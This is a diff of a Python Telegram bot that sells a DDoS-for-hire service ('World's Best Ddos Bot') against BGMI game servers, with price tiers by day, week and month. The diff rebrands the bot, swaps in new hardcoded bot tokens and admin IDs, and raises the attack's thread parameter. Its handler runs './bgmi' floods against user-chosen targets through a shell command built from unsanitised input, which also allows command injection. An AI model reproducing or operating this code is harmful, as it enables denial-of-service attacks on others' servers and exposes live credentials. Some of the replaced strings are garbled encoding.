@@ -1,5 +1,4 @@
 #!/usr/bin/python3
-#By Indian Watchdogs @Indian_Hackers_Team
 
 import telebot
 import subprocess
@@ -8,10 +7,10 @@ import datetime
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7259034553:AAEDL-i8pDIFToiU7PSyLvcIxidlhr101R4')
+bot = telebot.TeleBot('7290157573:AAHjy56wfC7XspuppiCg2RbwJthfO7oXgxs')
 
 # Admin user IDs
-admin_id = ["5588464519"]
+admin_id = ["1214193595"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -208,24 +207,24 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
+    response = f"{username}, Attack Started.\n\nð“ðšð«ð ðžð­: {target}\nðð¨ð«ð­: {port}\nð“ð¢ð¦ðž: {time} ð’ðžðœð¨ð§ðð¬\nðŒðžð­ð¡ð¨ð: BGMI"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
-COOLDOWN_TIME =0
+COOLDOWN_TIME =10
 
 # Handler for /bgmi command
-@bot.message_handler(commands=['bgmi'])
-def handle_bgmi(message):
+@bot.message_handler(commands=['bgmi1'])
+def handle_bgmi1(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 1:
-                response = "You Are On Cooldown. Please Wait 10 second Before Running The /bgmi Command Again."
+                response = "You Are On Cooldown. Please Wait 10 second Before Running The /bgmi1 Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -242,13 +241,13 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 400"
+                full_command = f"./bgmi {target} {port} {time} 700"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
-            response = "Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+            response = "Usage :- /bgmi1 <target> <port> <time>"  # Updated command syntax
     else:
-        response = "You Are Not Authorized To Use This Command.\nBy @venomXcrazy"
+        response = "You Are Not Authorized To Use This Command.\nBy @ishugrapher"
 
     bot.reply_to(message, response)
 
@@ -278,14 +277,14 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text = '''Available commands:
- /bgmi : Method For Bgmi Servers. 
+ /bgmi1 : Method For Bgmi Servers. 
  /rules : Please Check Before Use !!.
  /mylogs : To Check Your Recents Attacks.
  /plan : Checkout Our Botnet Rates.
 
  To See Admin Commands:
  /admincmd : Shows All Admin Commands.
- By  @venomXcrazy
+ By  @ishugrapher
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -300,7 +299,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy @venomXcrazy"
+    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy @ishugrapher"
     bot.reply_to(message, response)
 
 
@@ -312,7 +311,7 @@ def welcome_rules(message):
 1. Dont Run Too Many Attacks !! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
 3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
-By @venomXcrazy'''
+By @ishugrapher'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
@@ -329,7 +328,7 @@ Pr-ice List:
 Day-->100 Rs
 Week-->250 Rs
 Month-->600 Rs
-By  @venomXcrazy
+By  @ishugrapher
 '''
     bot.reply_to(message, response)
 
@@ -344,7 +343,7 @@ def welcome_plan(message):
 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
-By  @venomXcrazy
+By  @ishugrapher
 '''
     bot.reply_to(message, response)
 
@@ -375,4 +374,4 @@ def broadcast_message(message):
 
 
 bot.polling()
-#By venom crazy  @venomXcrazy
+#By  @ishugrapher
